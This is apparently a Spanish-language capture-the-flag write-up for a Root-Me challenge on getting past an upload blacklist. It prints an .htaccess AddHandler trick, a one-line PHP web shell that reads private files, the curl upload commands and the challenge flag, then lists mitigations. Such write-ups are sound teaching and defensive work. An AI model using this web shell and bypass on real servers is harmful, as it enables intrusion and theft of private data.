
# Root-Me CTF: PHP - Apache Configuration Bypass

## 🚩 Flag

`ht@cc3ss2RCE4th%w1n`

## 📝 Descripción del Reto

El objetivo era obtener ejecución de código remoto (RCE) en un servidor Apache que permitía la subida de archivos pero bloqueaba la extensión `.php`. El reto consistía en manipular la configuración del servidor a través de un archivo `.htaccess` para forzar la ejecución de archivos con extensiones no prohibidas.

## 🛠️ Herramientas y Técnicas

* **Herramientas:** `curl`, `bash`, `PHP`.
* **Vulnerabilidades:** Arbitrary File Upload & Server Misconfiguration (Apache `.htaccess` override).
* **Técnica de bypass:** Uso de `AddHandler` para remapear extensiones.

---

## 🔍 Análisis de la Vulnerabilidad

### 1. El Filtro de Aplicación

La aplicación web implementaba una **Lista Negra (Blacklist)** que rechazaba cualquier archivo con la extensión `.php`. Sin embargo, no filtraba archivos de configuración del servidor como el `.htaccess`.

### 2. El Agujero en Apache

El servidor tenía habilitada la directiva `AllowOverride`, lo que permitía que un archivo `.htaccess` subido por el usuario sobrescribiera las reglas del directorio de subidas.

---

## 🚀 Proceso de Explotación

### Paso 1: Manipulación de la Configuración de Apache

Se creó un archivo `.htaccess` para instruir al servidor a tratar los archivos `.hacker` como scripts de PHP.

```apache
# Archivo: .htaccess
AddHandler php7-script .hacker

```

### Paso 2: Subida de la Web Shell

Se diseñó un script PHP minimalista para leer archivos del sistema y se guardó con la extensión permitida `.hacker`.

```php
# Archivo: shell.hacker
<?php system("cat ../../private/*"); ?>

```

### Paso 3: Persistencia de Sesión y Ejecución

Debido a que el servidor aislaba las subidas por sesión (`PHPSESSID`), fue necesario usar el mismo archivo de cookies para que el `.htaccess` afectara al directorio donde se encontraba la shell.

```bash
# Subida del .htaccess guardando la cookie
curl -F "uploaded_file=@.htaccess" -F "submit=Upload" -c cookies.txt [URL]

# Subida de la shell usando la misma cookie
curl -F "uploaded_file=@shell.hacker" -F "submit=Upload" -b cookies.txt [URL]

```

### Paso 4: Obtención de la Flag

Al acceder a la ruta de la shell, el servidor Apache interpretó el archivo `.hacker` como PHP, ejecutó el comando de sistema y devolvió el contenido de la carpeta `/private/`.

---

## 🛡️ Medidas de Mitigación

1. **Deshabilitar overrides:** Configurar `AllowOverride None` en los directorios donde los usuarios pueden subir archivos.
2. **Lista Blanca (Whitelist):** Solo permitir extensiones conocidas y seguras (ej. `.jpg`, `.png`, `.pdf`) en lugar de intentar bloquear solo `.php`.
3. **Renombrado de Archivos:** Renombrar los archivos subidos a nombres aleatorios sin conservar la extensión original del usuario.
4. **Aislamiento:** Subir los archivos a un dominio o servidor de almacenamiento estático (como S3) donde no se pueda ejecutar código del lado del servidor.

---
